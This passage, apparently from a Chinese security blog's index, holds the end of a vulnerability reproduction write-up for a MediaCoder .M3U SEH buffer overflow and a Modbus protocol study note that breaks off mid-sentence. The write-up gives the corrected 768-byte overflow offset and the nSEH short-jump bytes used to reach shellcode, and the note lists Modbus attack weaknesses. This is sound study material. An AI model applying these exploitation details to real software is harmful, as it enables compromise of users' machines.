while循环中进行连续赋值，读取赋值的终止条件是取到的值为0，并没有对长度进行限制,那也就是说只要文档里有字符就会一一读出来，很明显有安全漏洞啊\n\n![image-20200430181226364](https://tva1.sinaimg.cn/large/007S8ZIlly1gebyiaspcpj30ky05dwek.jpg)\n\n我们在OllyDbg里进行进一步的动态调试，可知读取的内容位置起始为12f380\n\n![image-20200430181811372](https://tva1.sinaimg.cn/large/007S8ZIlly1gebyo9zxnmj30h803vt8q.jpg)\n\n最终报错是因为构造的文件内容太长，把这段堆栈给完全填满了，mov指令在填充下一个时访问到了不可访问的位置（130000），最终报错。\n\n![截屏2020-04-30 下午5.11.01](https://tva1.sinaimg.cn/large/007S8ZIlly1gebyru0la5j30n108lgm2.jpg)\n\n![截屏2020-04-30 下午5.45.34](https://tva1.sinaimg.cn/large/007S8ZIlly1gebyrz2nj3j30nl0hwq49.jpg)\n\n总结来说就是由于对于文件的长度没有进行有效控制，从而导致后续函数处理调用畸形字符串时导致程序指针引用异常访问到了不可访问的位置，进入SEH处理，从而引发任意代码执行。\n\n### 漏洞利用\n\n原博中的exp没能成功利用而是直接崩溃，应该是位置没算好导致的，利用OD查看该程序SEH分布，离最近的应该是12f688，但是看原来生成的文件在堆栈里的分布正好错了一行，这是导致没有利用成功的主要原因\n\n![截屏2020-04-30 下午4.34.19](https://tva1.sinaimg.cn/large/007S8ZIlly1gebz33ujcsj30w40mpdk1.jpg)\n\n首尾减一下应该是768个A，再生成一边看看堆栈的分布，就正好对上了\n\n![截屏2020-04-30 下午5.05.21](https://tva1.sinaimg.cn/large/007S8ZIlly1gebz521tbrj30e707qt91.jpg)\n\n再看SEH的跳转地址也变对了，指向下一个SEH记录的指针（简称nseh），指示下一个seh结构的位置，此处使用“ \\ xeb \\ x06 \\ x90 \\ x90”填充，这四字节反汇编的结果是jmp 6，nop，nop三条指令，jmp 6表示跳过6个字节，刚好跳过两个nop指令和一个4字节的seh处理程序地址，然后落入nop指令区，滑行进入shellcode。\n\n![截屏2020-04-30 下午5.05.29](https://tva1.sinaimg.cn/large/007S8ZIlly1gebz6ewn40j308906kq30.jpg)\n\n整个利用过程就如下图所示\n\n![image-20200430185453204](https://tva1.sinaimg.cn/large/007S8ZIlly1gebzqguv6cj30g807jgmb.jpg)\n\n此时把文件拖入程序尝试一下，发现成功蹦出了计算器\n\n![image-20200430185641358](https://tva1.sinaimg.cn/large/007S8ZIlly1gebzscfjhgj311w0kd1aw.jpg)\n\n\n\n### 文章参考\n\n漏洞分析——MEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞 [https://ayesawyer.github.io/2019/07/03/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94MEDIACODER-0-8-43-5852-M3U%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/](https://ayesawyer.github.io/2019/07/03/漏洞分析——MEDIACODER-0-8-43-5852-M3U缓冲区溢出漏洞/)\n\nMEDIACODER 0.8.43.5852 - .M3U缓冲区溢出漏洞\n\nhttps://whereisk0shl.top/post/2018-06-23\n\nMediacoder 0.8.43.5852-'.m3u'（SEH）\n\n https://www.exploit-db.com/exploits/40148","tags":["漏洞复现","漏洞分析"],"categories":["二进制"]},{"title":"工控Modbus学习笔记（在FreeBuf原文上增改）","url":"/2021/01/25/Modbus/","content":"\n自己Modbus的学习笔记，在原文基础上增加了许多更细致的描述与配图，也增加了几个模块的内容，内容丰富了许多。欢迎各位在此基础上继续积累，使其愈加完善。\n\n<!-- more -->\n\n## 术语\n\n1 word =2 byte;\n\n1 byte =8 bit.\n\n**校验码**：校验码是由前面的数据通过某种算法得出的，用以检验该组数据的正确性。代码作为数据在向计算机或其它设备进行输入时，容易产生输入错误，为了减少这种输入错误，编码专家发明了各种校验检错方法，并依据这些方法设置了校验码。\n\n常用的校验有：累加和校验SUM、字节异或校验XOR、纵向冗余校验LRC、循环冗余校验CRC……\n\n**离散量输入**：主要用来读取单个位的数据，如IO的状态；\n\n**线圈**：开关输出信号，主要用来写入单个位的数据，与离散量构成组成对位的操作；\n\n**输入寄存器**：主要用来读取16位，也就是两个字节的数据；\n\n**保持寄存器**：主要用来写入16位的数据。\n\n**PLC**：可编程逻辑控制器，是一种采用一类可编程的存储器，用于其内部存储程序，执行逻辑运算、顺序控制、定时、计数与算术操作等面向用户的指令，并通过数字或模拟式输入/输出控制各种类型的机械或生产过程。\n\n**串口通信**：随着计算机系统的应用和微机网络的发展，通信功能越来越显得重要.这里所说的通信是指计算机与外界的信息交换.因此，通信既包括计算机与外部设备之间，也包括计算机和计算机之间的信息交换.由于串行通信是在一根传输线上一位一位的传送信息，所用的传输线少，并且可以借助现成的电话网进行信息传送，因此，特别适合于远距离传输.对于那些与计算机相距不远的人－机交换设备和串行存储的外部设备如终端、打印机、逻辑分析仪、磁盘等，采用串行方式交换数据也很普遍.在实时控制和管理方面，采用多台微机处理机组成分级分布控制系统中，各 CPU 之间的通信一般都是串行方式.所以串行接口是微机应用系统常用的接口。许多外设和计算机按串行方式进行通信，这里所说的串行方式，是指外设与接口电路之间的信息传送方式，实际上，CPU 与接口之间仍按并行方式工作.\n\n**串口**：串口是计算机上一种非常通用设备通信的协议，不要与通用串行总线Universal Serial Bus（USB）混淆。大多数计算机包含两个基于RS232的串口。串口同时也是仪器仪表设备通用的通信协议；很多GPIB兼容的设备也带有RS-232口。同时，串口通信协议也可以用于获取远程采集设备的数据。 \n\n串口通信的概念非常简单，串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。它很简单并且能够实现远距离通信。比如IEEE488定义并行通行状态时，规定设备线总常不得超过20米，并且任意两个设备间的长度不得超过2米；而对于串口而言，长度可达1200米。 \n\n典型地，串口用于ASCII码字符的传输。通信使用3根线完成：（1）地线，（2）发送，（3）接收。由于串口通信是异步的，端口能够在一根线上发送数据同时在另一根线上接收数据。其他线用于握手，但是不是必须的。**串口通信最重要的参数是波特率、数据位、停止位和奇偶校验**。对于两个进行通行的端口，这些参数必须匹配：  \n\n>   **a. 波特率**：这是一个衡量通信速度的参数。它表示每秒钟传送的bit的个数。例如300波特表示每秒钟发送300个bit。当我们提到时钟周期时，我们就是指波特率。例如如果协议需要4800波特率，那么时钟是4800Hz。这意味着串口通信在数据线上的采样率为4800Hz。通常电话线的波特率为14400，28800和36600。波特率可以远远大于这些值，但是波特率和距离成反比。高波特率常常用于放置的很近的仪器间的通信，典型的例子就是GPIB设备的通信。\n>   **b. 数据位**：这是衡量通信中实际数据位的参数。当计算机发送一个信息包，实际的数据不会是8位的，标准的值是5、7和8位。如何设置取决于你想传送的信息。比如，标准的ASCII码是0～127（7位）。扩展的ASCII码是0～255（8位）。如果数据使用简单的文本（标准 ASCII码），那么每个数据包使用7位数据。每个包是指一个字节，包括开始/停止位，数据位和奇偶校验位。由于实际数据位取决于通信协议的选取，术语“包”指任何通信的情况。\n>   **c. 停止位**：用于表示单个包的最后一位。典型的值为1，1.5和2位。由于数据是在传输线上定时的，并且每一个设备有其自己的时钟，很可能在通信中两台设备间出现了小小的不同步。因此停止位不仅仅是表示传输的结束，并且提供计算机校正时钟同步的机会。适用于停止位的位数越多，不同时钟同步的容忍程度越大，但是数据传输率同时也越慢。\n>   **d. 奇偶校验位**：在串口通信中一种简单的检错方式。有四种检错方式：偶、奇、高和低。当然没有校验位也是可以的。对于偶和奇校验的情况，串口会设置校验位（数据位后面的一位），用一个值确保传输的数据有偶个或者奇个逻辑高位。例如，如果数据是011，那么对于偶校验，校验位为0，保证逻辑高的位数是偶数个。如果是奇校验，校验位位1，这样就有3个逻辑高位。高位和低位不真正的检查数据，简单置位逻辑高或者逻辑低校验。这样使得接收设备能够知道一个位的状态，有机会判断是否有噪声干扰了通信或者是否传输和接收数据是否不同步。\n>\n> ![image-20191024205159337](https://tva1.sinaimg.cn/large/006y8mN6ly1g89l02e0rnj30n90e2jvs.jpg)\n\n## 背景\n\n早在1971年，Modicon公司首次推出了Modbus协议，ModbusRTU和Modbus ASCII诞生于此。后来施耐德电气（SchneiderElectric）收购了Modicon公司，并在1997年推出了ModbusTCP协议。2004年，中国国家标准委员会正式把Modbus作为了国家标准，开启了Modbus为中国工业通信做贡献的时代。\n\n![image-20191024205739456](https://tva1.sinaimg.cn/large/006y8mN6ly1g89leq1mqdj30o00fjq4x.jpg)\n\n通过此协议，控制器相互之间、控制器经由网络和其它设备之间可以通信。Modbus协议具有标准、开放，可以支持多种电气接口，数据帧格式简单紧凑，数据传输量大、实时性好等特点，在工业控制系统中得到了广泛的应用，已经成为通用工业标准。深入分析Modbus协议实现原理和其安全性对提高工控系统安全性有着重要的现实意义。ModbusRTU和ModbusASCII主要用于串行通信领域，而ModbusTCP则常用于以太网通信。现在，Modbus已经成为工业领域通信协议标准，并且现在是工业电子设备之间相当常用的连接方式。\n\n[![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89irrxfujj30j604n75s.jpg)](https://image.3001.net/images/20170921/15060057119653.png)\n\n\n\n![image-20191024204652957](https://tva1.sinaimg.cn/large/006y8mN6ly1g89kuqvhv0j30nb0a7gnm.jpg)\n\n\n\n## 协议原理\n\n\n\nModbus使用一种简单的MasterandSlave主从协议（客户机/服务器协议）进行通信。客户机作为主站，向服务器发送请求；服务器（从站）接到请求后，对请求进行分析并作出应答。其中使用的通信帧被称为应用数据单元（Application Data Unit，ADU），它包括通信地址段、功能代码段、数据段和校验段，如下图： \n\n\n\n[![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89irsxzo4j30j604u0t8.jpg)](https://image.3001.net/images/20170921/1506005632357.png)\n\n\n\n\n\n一般使用上，监控系统(HMI)都为Master，PLC、电表、仪表等都为Slave，HMI系统一直PollingSlave的各种relayandregister最新数值，然后做显示及各种逻辑计算及控制调整等处理。\n\n\n\n其中，功能代码段和数据段组合称为协议数据单元（Protocol Data Unit or Protocol Description Unit)，PDU）。功能代码段占用一个字节，取值范围为1-255，其中128-255为保留值，用于异常消息应答报文。1-127为功能代码编号，其中65-72和100-110为用户自定义编码。\n\n\n\nModbus协议建立了主设备查询的格式：设备（或广播）地址、功能代码、所有要发送的数据、错误检测域。\n\n从设备回应消息也由Modbus协议构成，包括：确认要行动的域、任何要返回的数据、和错误检测域。\n\n***查询***\n\n数据段包含了从设备要执行功能的任何附加信息：从何寄存器开始读、要读的寄存器数量，错误检测域为从设备提供了一种验证消息内容是否正确的方法。\n\n***回应***\n\n查询消息中的功能代码的回应。数据段包括了从设备收集的数据：像寄存器值或状态。如果有错误发生，功能代码将被修改以用于指出回应消息是错误的，同时数据段包含了描述此错误信息的代码。错误检测域允许主设备确认消息内容是否可用。\n\n![image-20191024210653222](https://tva1.sinaimg.cn/large/006y8mN6ly1g89lfkj27yj310l09r79j.jpg)\n\n\n\n## 传输方式\n\n\n\nModbus 协议是一种应用层报文传输协议，包括ASCII、RTU、TCP三种报文类型，协议本身并没有定义物理层，只是定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。\n\n\n\nModbus 协议使用串口传输时可以选择RTU或ASCII模式，并规定了消息、数据结构、命令和应答方式并需要对数据进行校验。ASCII 模式采用LRC校验，RTU模式采用16 位CRC校验。RTU与ASCII不能混用，ASCII可打印字符便于故障检测，而且对用高级语言（如Fortran）编程的主计算机及主PC很适宜。RTU则适用于机器语言编程的计算机和PC主机。 通过以太网传输时使用TCP，这种模式不使用校验，因为TCP协议是一个面向连接的可靠协议。\n\n​\t***ASCII与RTU相互转换***\n\n​\tRTU模式传输的数据:是8位二进制字符，分高位和低位，每部分各含4位。\n\n​\tASCII模式传输的数据:是16位十六进制字符。\n\n区别：\n\n- ​\tASCII模式使用的字符虽是RTU模式的两倍，但ASCII数据的译码和处理更为容易一些\n- ​\t用RTU模式时报文字符必须以连续数据流的形式传送，用ASCII模式，字符之间可产生长达1s的间隔，以适应速度较慢的机器。\n\n​\t***ASCII***\n\n​\t一个信息中的每4位字节作为1个ASCII字符传输，如数值63H用ASCII方式时，需发送两个字节，即ASCII“6\"（0110110）和ASCII”3“（0110011），1个ASCII字符占用的位数有7位和8位，国际通用7位为多。这种方式的主要优点是字符发送的时间间隔可达到1秒而不产生错误。\n\n代码系统：\n\n- 十六进制，ASCII字符0...9,A...F\n\n- 消息中的每个ASCII字符都是一个十六进制字符组成\n\n  每个字节的位：\n\n- 1个起始位\n\n- 7个数据位，最小的有效位先发送\n\n- 1个奇偶校验位，无校验则无\n\n- 1个停止位（有校验时），2个Bit（无校验时）\n\n- 错误检测域\n\n- LRC(纵向冗长检测)\n\n​\t***RTU***\n\n​\t当控制器设为在Modbus网络上以RTU模式通信，在消息中的每个8Bit字节按照原值传送，不做处理，如63H，RTU将直接发送01100011。这种方式的主要优点是：数据帧传送之间没有间隔，相同波特率下传输数据的密度要比ASCII高，传输速度更快。\n\n代码系统：\n\n- ​\t8位二进制，十六进制数0...9，A...F\n- ​\t消息中的每个8位域都是一或两个十六进制字符组成\n\n每个字节的位：\n\n- ​\t1个起始位\n\n- ​\t8个数据位，最小的有效位先发送\n\n- ​\t1个奇偶校验位，无校验则无\n\n- ​\t1个停止位（有校验时），2个Bit（无校验时）\n\n  \n\n## Modbus数据模型\n\n![image-20191024212243618](https://tva1.sinaimg.cn/large/006y8mN6ly1g89lw1t6d9j30yb0bsgr2.jpg)\n\n## Modbus RTU**和**Modbus ASCII有什么区别？\n\n\n\nModbus是一种应用层协议，它定义了与基础网络无关的数据单元（ADU），可以在以太网（TCP/IP）或串行链路上（RS232、RS485等）进行通信（以太网ADU和串行ADU略有不同）。在串行链路上，Modbus协议有两种传输模式——ASCII模式和RTU模式。其中，ASCII是英文“American Standard Code for Information Interchange”的缩写，中文翻译为“美国国家信息交换标准编码”；RTU是英文“ Remote Terminal Unit”的缩写，中文翻译为“远程终端设备”。\n\n\n\n首先，让我们来看看Modbus的工作原理。\n\n\n\nModbus采用主从（Master-Salve）通信模式，仅有主设备（Master）能对传输进行初始化，从设备（Slave）根据主设备的请求进行应答。典型的主设备包括现场仪表和显示面板，典型的从设备为可编程逻辑控制器（PLC）。\n\n\n\n在串行链路的主从通信中，Modbus主设备可以连接一个或N（最大为247）个从设备，主从设备之间的通信包括单播模式和广播模式。\n\n![image-20191024212953487](https://tva1.sinaimg.cn/large/006y8mN6ly1g89m3i1roxj30yp04ymy1.jpg)\n\n在广播模式中，Modbus主设备可同时向多个从设备发送请求（设备地址0用于广播模式），从设备对广播请求不进行响应。\n\n\n\n在单播模式中，主设备发送请求至某个特定的从设备（每个Modbus从设备具有唯一地址），请求的消息帧中会包含功能代码和数据，比如功能代码“01”用来读取离散量线圈的状态。从设备接到请求后，进行应答并把消息反馈主设备。\n\n\n\n[![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89irrip7gj30av092myt.jpg)](https://image.3001.net/images/20170921/1506006245516.png)\n\n\n\n\n\n在主从设备的通信中，可以使用ASCII模式或者RTU模式。\n\n![image-20191024213040383](https://tva1.sinaimg.cn/large/006y8mN6ly1g89m4b3ybrj30yp0evwkj.jpg)\n\n在ASCII（AmericanStandard Code for Information Interchange）传输模式下，消息帧以英文冒号（“：”，ASCII3A Hex）开始，以回车 和换号（CRLF，ASCII 0D and 0A Hex）符号结束，允许的传输的字符集为十六进制的0-9和A-F；网络中的从设备监视传输通路上是否有英文冒号（“：”），如果有的话，就对消息帧进行解码，查看消息中的地址是否与自己的地址相同，如果相同的话，就接收其中的数据；如果不同的话，则不予理会。\n\n\n\n[![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89iru5pozj30j603nmxw.jpg)](https://image.3001.net/images/20170921/15060064703424.png)\n\n\n\n\n\n在ASCII模式下，每个8位的字节被拆分成两个ASCII字符进行发送，比如十六进制数0xAF ,会被分解成ASCII字符“A”和“F”进行发送，发送的字符量比RTU增加一倍。ASCII模式的好处是允许两个字符之间间隔的时间长达1s而不引发通信故障，该模式采用纵向冗余校验（Longitudinal Redundancy Check ，LRC)） 的方法来检验错误，\n\n\n\n\n\n当控制器设为在Modbus 网络上以ＲTU 模式通信，消息中的每个8Bit 字节都包含两个4 Bit 的十六进制字符，这种模式没有开始和结束标记。其优点是: 在同样的波特率下，可比传送更多的数据。\n\n\n\n在RTU（RemoteTerminal Unit）模式下，每个字节可以传输两个十六进制字符，比如十六进制数0xAF，直接以十六进制0xAF（二进制：10101111）进行发送，因此它的发送密度比ASCII模式高一倍；RTU模式采用循环冗余校验（CRC），下面是对RTU模式的总结：\n\n\n\n具体格式如图 所示。\n\n\n\n[![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89irtpjphj30j603fq3f.jpg)](https://image.3001.net/images/20170921/15060064268162.png)\n\n![image-20191024213555654](https://tva1.sinaimg.cn/large/006y8mN6ly1g89m9s89wmj30mk037t9w.jpg)\n\n\n\n## CRC与LRC\n\n***CRC***\n\nCRC域是两个字节，包含一16位的二进制值。它由传输设备计算后加入到消息中。接收设备重新计算收到消息的CRC，并与接收到的CRC域中的值比较，如果两个值不同，则有误。\n\nCRC是先调入值是全“1”的16位寄存器，然后调用过程将消息中连续的8位字节和当前寄存器中的值进行处理。仅每个字符中的8Bit数据对CRC有效，起始位和停止位以及奇偶校验位均无效。\n\nCRC产生过程中，每个8位字符都单独和寄存器内容相异或（XOR），结果向最低有效位方向移动，最高有效位以0填充。LSB被提取出来检测，如果LSB为1，寄存器单独和预置的值或一下，如果LSB为0，则不进行。整个过程要重复8次。在最后一位（第8位）完成后，下一个8位字节又单独和寄存器的当前值相异或（XOR）。最终寄存器中的值，是消息中所有的字节都执行之后的CRC值。\n\nCRC添加到消息中时，低字节先加入，然后高字节。\n\nCRC-16错误校验程序如下：报文（此处只涉及数据位，不指起始位、停止位和任选的奇偶校验位）被看作是一个连续的二进制，其最高有效位（MSB）首选发送。报文会先与X↑16相乘（左移16位），然后看X↑16+X↑15+X↑2+1除，X↑16+X↑15+X↑2+1可以表示为二进制数11000，0000，0000，0101。整数商位忽略不记，16位余数加入该报文（MSB先发送），成为2个CRC校验字节。余数中的1全部初始化，以免所有的零成为一条报文被接收。经上述处理而含有CRC字节的报文，若无错误，到接收设备后再被同一多项式（X↑16+X↑15+X↑2+1）除，会得到一个零余数（接收设备核验这个CRC字节，并将其与被传送的CRC比较）。全部运算以2为模（无进位）。\n\n习惯于成串发送数据的设备会首选送出字符的最右位（LSB-最低有效位）。而在生成CRC情况下，发送首位应是被除数的最高有效位MSB。由于在运算中不用进位，为便于操作起见，计算CRC时设MSB在最右位。生成多项式的位序也必须反过来，以保持一致。多项式的MSB略去不记，因其只对商有影响而不影响余数。\n\n生成CRC-16校验字节的步骤如下：\n\n1. 装如一个16位寄存器，所有数位均为1。\n\n2. 该16位寄存器的高位字节与开始8位字节进行“异或”运算。运算结果放入这个16位寄存器。\n\n3. 把这个16寄存器向右移一位。\n4. 若向右（标记位）移出的数位是1，则生成多项式10，1000，000，0000，001和这个寄存器进行“异或”运算；若向右移出的数位是0，则返回3。\n\n5. 重复3和4，直至移出8位。\n\n6. 另外8位与该十六位寄存器进行“异或”运算。\n\n7. 重复3-6，直至该报文所有字节均与16位寄存器进行“异或”运算，并移位8次。\n\n8. 这个16位寄存器的内容即2字节CRC错误校验，被加到报文的最高有效位。\n\n另外，在某些非Modbus通信协议中也经常使用CRC16作为校验手段，而且产生了一些CRC16的变种，他们是使用CRC16多项式X↑16+X↑15+X↑2+1，单首次装入的16位寄存器为0000；使用CRC16的反序X↑16+X↑14+X↑1+1，首次装入寄存器值为0000或FFFFH。\n\n\n\n***LRC***\n\nLRC错误校验用于ASCII模式。这个错误校验是一个8位二进制数，可作为2个ASCII十六进制字节传送。把十六进制字符转换成二进制，加上无循环进位的二进制字符和二进制补码结果生成LRC错误校验（参见图）。这个LRC在接收设备进行核验，并与被传送的LRC进行比较，冒号（：）、回车符号（CR）、换行字符（LF）和置入的其他任何非ASCII十六进制字符在运算时忽略不计。\n\n## 帧的标示与识别\n\n报文帧的识别\n\n![image-20191024213737329](https://tva1.sinaimg.cn/large/006y8mN6ly1g89mbjn0tsj30vd06pdie.jpg)\n\n字符之间的要求\n\n![image-20191024213807380](https://tva1.sinaimg.cn/large/006y8mN6ly1g89mc2br71j30vd06pdhy.jpg)\n\n## MODBUS TCP注意点\n\n###  主机和从机、服务端和客户端\n\n【在modbus协议中】\n\n主机发送modbus请求，从机根据请求内容向主机返回响应。在modbus协议中，主机总是主动方，从机总是被动方。\n\n【在网络应用中】\n\n在网络应用中存在客户端和服务器端，客户端（例如浏览器）发送请求到服务器，服务器向客户端返回内容（例如HTML文本）。\n\n【在modbus tcp中】\n\n主机是客户端，而从机是服务器端。千万不要以为服务器端重要，主机也重要，所以主机就是服务器端。\n\n###  是否可以多主机\n\n  通过前面的分析，主机为客户端那么modbustcp支持多个主机，在一个局域网中可存在多个主机和多个从机。从机的连接能力（连接主机的数量）由uIP的最大TCP连接个数决定。\n\n###  modbus TCP协议简述\n\nmodbus TCP和modbus RTU基本相同，但是也存在一些区别\n\na.从机地址变得不再重要，多数情况下忽略。从某种意义上说从机地址被IP地址取代\n\nb.CRC校验变得不再重要，甚至可以忽略。由于TCP数据包中已经存在校验，为了不重复造轮子，modbus TCP干脆取消了CRC校验。\n\nTCP 模式是为了让Modbus 数据顺利在以太网上传输产生的，使用TCP502 端口。该协议物理层，数据链路层，网络层，传输层都是基于TCP 协议，只在应用层，将Modbus 协议修改后封装进去; 接收端将该TCP 数据包拆封后，重新获得原始Modbus 帧，然后按照Modbus 协议规范进行解析，并将返回的数据包重新封装进TCP 协议中，返回到发送端。与串行链路传输的数据格式不同，TCP 模式去除了附加地址和校验，增加了报文头，其具体格式如图4所示。\n\n\n\n [![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89irt8wamj30j60avdif.jpg)](https://image.3001.net/images/20170921/1506006521490.png)\n\n在modbus TCP中包含一个MBAP头，该头包含以下几个部分\n\n| 区域     | 长度  | 描述                              | 客户端     | 服务器               |\n| :------- | :---- | :-------------------------------- | :--------- | :------------------- |\n| 传输标志 | 2字节 | MODBUS 请求和响应传输过程中序列号 | 客户端生成 | 应答时复制该值       |\n| 协议标志 | 2字节 | Modbus协议默认为0                 | 客户端生成 | 应答时复制该值       |\n| 长度     | 2字节 | 剩余部分的长度                    | 客户端生成 | 应答时由服务器端生成 |\n| 单元标志 | 1字节 | 从机标志（从机地址）              | 客户端生成 | 应答时复制该值       |\n\n【注意】\n\n> 【1】传输标志可理解为序列号，防止 MODBUS TCP通信错位，例如后发生的响应先到了主机，而早发生的响应后到主机\n>\n> 【2】单元标志可理解为从机地址，此时已经不再重要\n\n###  modbus tcp 和 TCP IP的关系\n\nmodbus TCP可以理解为发生在TCP上的应用层协议，既然是TCP协议那么一个完整的MODBUSTCP报文必然包括TCP首部，IP首部和Ethernet首部。\n\n## 功能码作用\n\n启动Modbus事务处理的客户机创建Modbus应用数据单元。功能码（PDU中的）向服务器指示将执行哪种操作。\n\n![image-20191024214153200](https://tva1.sinaimg.cn/large/006y8mN6ly1g89mfzk77yj30am0lljtr.jpg)\n\n用一个字节编码Modbus数据单元的功能码域。有效范围是十制制1-255（128-255为异常响应保留）。当从客户机向服务器发送报文时，功能码域通过服务器执行哪种操作。\n\n从客户机向服务器发送的报文数据域包括附加信息，服务器使用这个信息执行功能码定义的操作。这个域还包括离散项目和寄存器地址、处理项目的数量以及域中的实际数据字节数。\n\n在某种请求中，数据域可以是不存在的，在此情况下服务器不需要任何附加信息。功能码仅说明操作。\n\n**功能码的类型**\n\n功能码主要分为有效功能码、异常功能码和错误功能码。\n\n如果在一个正确接收Modbus ADU中，不出现与请求Modbus功能有关的差错，那么服务器至客户机的响应数据会包含请求中的正常功能码。\n\n![image-20191024211304406](https://tva1.sinaimg.cn/large/006y8mN6ly1g89lm0csp6j30un0f7n1r.jpg)\n\n如果出现与请求Modbus功能有关的差错，那么响应数据会包含一个异常码和错误码。\n\n![image-20191024211459248](https://tva1.sinaimg.cn/large/006y8mN6ly1g89lo01xnvj30kl0a5gnk.jpg)\n\n例如，客户机能够读一组离散量输出或输入的开/关状态，或者用户能够读/写一组寄存器数据内容。当服务器对客户机响应时，它使用功能码域来指示正常（无差错）响应或出现某种差错（称为异常响应）。对于一个正常响应来说，服务器仅对原始功能码响应，如下图：\n\n对于异常响应，服务器返回一个与客户机等同的码，设置该原始功能码的最高有效位为逻辑1，并加该异常码后增加错误码，以通知客户机异常原因。如下图：\n\n**有效功能码**\n\n有效功能码有二十几种，但是一般使用上都以1、2、3、4、5、6、15、16等八种最为常用，以及另外特殊使用的20、21两种，此为General Reference Register，绝大部份的Modbus设备并不会提供此Register。于PLC上主要的控制数据有下列四种型式。此八种功能码就是处理这些控制资料，详细说明如下各点：\n\n**控制数据四种型式：**\n\nDI：DigitalInput（数字输入，离散输入），一个地址一个数据位，用户只能读取它的状态，不能修改。以一个 bit表示 On/Off，用来记录控制信号的状态输入，例如：开关，接触点，马达运转，超限switch…等等。于PLC上被称为Input relay、input coil等。\n\nDO：DigitalOutput（数字输出，线圈输出），一个地址一个数据位，用户可以置位、复位，可以回读状态。以一个 bit表示 On/Off，用来输出控制信号，以激活或停止马达，警铃，灯光…等等。于PLC上被称为Output relay、Output coil等。\n\nAI：Analog Input（模拟输入，输入寄存器），一个地址16位数据，用户只能读，不能修改，，以16 bits integer表示一个数值，用来记录控制信号的数值输入，例如：温度、流量、料量、速度、转速、文件板开度、液位、重量…等等。于PLC上被称为Input register。\n\nAO：AnalogOutput（模拟输出，保持寄存器），一个地址16位数据，用户可以写，也可以回读，以16 bits integer表示一个数值，用来输出控制信号的数值，例如：温度、流量、速度、转速、文件板开度、饲料量…等等设定值。于PLC上被称为Output register、Holding register。\n\n[![israbye FreeBuf.COM](https://tva1.sinaimg.cn/large/006y8mN6ly1g89irsc3sqj30j60gsagn.jpg)](https://image.3001.net/images/20170921/15060065568486.png)\n\n**Modbus功能码与数据类型的对应**\n\n![image-20191024214346782](https://tva1.sinaimg.cn/large/006y8mN6ly1g89mhyofizj30xv0evq7s.jpg)\n\n## Modebus异常码\n\n![image-20191024214535974](https://tva1.sinaimg.cn/large/006y8mN6ly1g89mjuatjbj30xv0k8drp.jpg)\n\n## Modbus **协议安全性分析**\n\nModbus 协议是典型的工控网协议，研究其安全性对于加强工业控制网络的安全性有重要意义。一般来说，协议安全性问题可以分为两种，一种是协议自身的设计和描述引起的安全问题; 另一种是协议的不正确实现引起的安全问题。Modbus 协议也存在着这两方面的问题。\n\n### Modbus 协议的固有问题\n\n绝大多数工控协议在设计之初，仅仅考虑了功能实现、提高效率、提高可靠性等方面，而没考虑过安全性问题。Modbus 协议也不例外，尽管其已经成为事实上的工业标准。从前面原理分析可以看出其本身的安全性问题是: 缺乏认证、授权、加密等安全防护机制和功能码滥用问题。\n\n**( 1) 缺乏认证**\n\n认证的目的是保证收到的信息来自合法的用户，未认证用户向设备发送控制命令不会被执行。在Modbus 协议通信过程中，没有任何认证方面的相关定义，攻击者只需要找到一个合法的地址就可以使用功能码就能建立一个Modbus 通信会话，从而扰乱整个或者部分控制过程。\n\n**( 2) 缺乏授权**\n\n授权是保证不同的特权操作需要由拥有不同权限的认证用户来完成，这样可大大降低误操作与内部攻击的概率。目前，Modbus 协议没有基于角色的访问控制机制，也没有对用户分类，没有对用户的权限进行划分，这会导致任意用户可以执行任意功能。\n\n**( 3) 缺乏加密**\n\n加密可以保证通信过程中双方的信息不被第三方非法获取。Modbus 协议通信过程中，地址和命令全部采用明文传输，因此数据可以很容易的被攻击者捕获和解析，为攻击者提供便利。\n\n**( 4) 功能码滥用**\n\n功能码是Modbus 协议中的一项重要内容，几乎所有的通信都包含功能码。目前，功能码滥用是导致Modbus 网络异常的一个主要因素。例如不合法报文长度，短周期的无用命令，不正确的报文长度，确认异常代码延迟等都有可能导致拒绝服务攻击。\n\n### 协议实现产生的问题\n\n虽然Modbus 协议获得了广泛的应用，但是在实现具体的工业控制系统时，开发者并不具备安全知识或者没有意识到安全问题。这样就导致了使用Modbus 协议的系统中可能存在各种各样的安全漏洞。\n\n**( 1) 设计安全问题**\n\nModbus 系统开发者重点关注的是其功能实现问题，安全问题在设计时很少被注意到。设计安全是指设计时充分考虑安全性，解决Modbus 系统可能出现的各种异常和非法操作等问题。比如在通信过程中，某个节点被恶意控制后发出非法数据，就需要考虑这些数据的判别和处理问题。\n\n**( 2) 缓冲区溢出漏洞**\n\n缓冲区溢出是指在向缓冲区内填充数据时超过了缓冲区本身的容量导致溢出的数据覆盖在合法数据上，这是在软件开发中最常见也是非常危险的漏洞，可以导致系统崩溃，或者被攻击者利用来控制系统。Modbus 系统开发者大多不具备安全开发知识，这样就会产生很多的缓冲区溢出漏洞，一旦被恶意者利用会导致严重的后果。\n\n**( 3) Modbus TCP 安全问题**\n\n目前，Modbus 协议已经可以在通用计算机和通用操作系统上实现，运行于TCP /IP 之上以满足发展需要。这样，TCP /IP 协议自身存在的安全问题不可避免地会影响到工控网络安全。非法网络数据获取，中间人，拒绝服务， IP 欺骗，病毒木马等在IP 互联网中的常用攻击手段都会影响Modbus 系统安全。\n\n### Modbus协议常见攻击总结\n\n#### Modbus协议中间人攻击\n\n![image-20191025183816402](https://tva1.sinaimg.cn/large/006y8mN6ly1g8amra4y0ej30a204kgmc.jpg)\n\nmodbus协议易于遭受中间人攻击（MiTM），攻击类型主要包括记录和重放攻击。有许多工具可以对modbus发起中间人攻击，开源工具modbus VCR就是其一，modbus 